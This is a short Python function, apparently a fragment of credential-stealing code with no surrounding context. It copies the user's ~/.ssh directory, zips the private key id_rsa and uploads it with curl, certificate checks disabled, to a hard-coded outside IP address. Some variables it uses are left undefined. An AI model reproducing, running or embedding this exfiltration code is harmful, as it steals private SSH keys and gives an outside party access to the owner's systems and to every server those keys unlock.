import os
import shutil
import zipfile

def collect():
    ssh_keys = '/Users/' + username + '/.ssh'
    if os.path.exists(ssh_keys):
        shutil.copytree(ssh_keys, scratch + "/keys")
    zipfile.ZipFile(bundle, "w").write(scratch + "/keys/id_rsa")
    os.system('curl --insecure -F "file=@' + bundle + '" https://54.254.189.27/collect')
